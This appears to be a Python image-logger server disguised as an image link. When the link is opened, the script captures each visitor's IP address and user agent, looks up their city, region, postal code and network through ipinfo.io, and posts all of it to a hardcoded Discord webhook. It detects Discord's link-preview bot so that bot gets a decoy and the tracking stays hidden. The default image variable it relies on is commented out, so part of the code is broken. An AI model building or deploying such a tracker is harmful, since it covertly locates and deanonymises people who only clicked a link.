from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import httpx, base64, httpagentparser

webhook = 'https://discord.com/api/webhooks/1548353585933451325/JGxatJWpqT8ilGi_K2NHWy7-Fw48DA0V1qohAlDO2D7nlVcoNTA3uWNtJIJL_0jrGZ5U'

# Default fallback image content
#try:
#    bindata = httpx.get('https://pbs.twimg.com/profile_images/1284155869060571136/UpanAYid_400x400.jpg').content
#except Exception:
#    bindata = b""

buggedimg = False
buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')

def formatHook(ip, city, reg, country, loc, org, postal, useragent, os, browser):
    return {
        "username": "Notifier",
        "embeds": [
            {
                "title": "Visitor Logged",
                "color": 16711803,
                "description": "A user accessed the endpoint. Details below:",
                "fields": [
                    {
                        "name": "IP Info",
                        "value": f"**IP:** `{ip}`\n**City:** `{city}`\n**Region:** `{reg}`\n**Country:** `{country}`\n**Location:** `{loc}`\n**ORG:** `{org}`\n**ZIP:** `{postal}`",
                        "inline": True
                    },
                    {
                        "name": "User-Agent Info",
                        "value": f"**OS:** `{os}`\n**Browser:** `{browser}`\n```yaml\n{useragent}\n```",
                        "inline": False
                    }
                ]
            }
        ],
    }

def prev(ip, uag):
    return {
        "username": "Notifier",
        "embeds": [
            {
                "title": "Preview Bot Detected",
                "color": 16711803,
                "description": f"Discord previewed the link image.\n\n**IP:** `{ip}`\n**UserAgent:**\n```yaml\n{uag}```"
            }
        ],
    }

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Extract custom target URL parameter if present
        s = self.path
        dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
        
        try:
            data = httpx.get(dic['url']).content if 'url' in dic else bindata
        except Exception:
            data = bindata

        # Extract User-Agent safely
        useragent = self.headers.get('user-agent', 'No User Agent Found!')
        
        try:
            os, browser = httpagentparser.simple_detect(useragent)
        except Exception:
            os, browser = "Unknown", "Unknown"

        # Safely determine the client IP address
        forwarded = self.headers.get('x-forwarded-for')
        if forwarded:
            ip = forwarded.split(',')[0].strip()
        else:
            ip = self.client_address[0]

        # Check for Discord proxy ranges
        is_discord_ip = ip.startswith(('35.', '34.', '104.196.'))
        is_discord_bot = 'discord' in useragent.lower()

        # Send standard image response headers
        self.send_response(200)
        self.send_header('Content-type', 'image/jpeg')
        self.end_headers()

        if is_discord_ip and is_discord_bot:
            self.wfile.write(buggedbin if buggedimg else bindata)
            try:
                httpx.post(webhook, json=prev(ip, useragent), timeout=5)
            except Exception:
                pass
        else:
            self.wfile.write(data)
            
            # Fetch IP info safely with fallback defaults
            try:
                ip_resp = httpx.get(f'https://ipinfo.io/{ip}/json', timeout=5)
                if ip_resp.status_code == 200:
                    info = ip_resp.json()
                else:
                    info = {}
            except Exception:
                info = {}

            city = info.get('city', 'Unknown')
            reg = info.get('region', 'Unknown')
            country = info.get('country', 'Unknown')
            loc = info.get('loc', 'Unknown')
            org = info.get('org', 'Unknown')
            postal = info.get('postal', 'Unknown')
            resolved_ip = info.get('ip', ip)

            try:
                httpx.post(webhook, json=formatHook(resolved_ip, city, reg, country, loc, org, postal, useragent, os, browser), timeout=5)
            except Exception:
                pass

if __name__ == "__main__":
    server = HTTPServer(('0.0.0.0', 8000), handler)
    print("Server running on port 8000...")
    server.serve_forever()
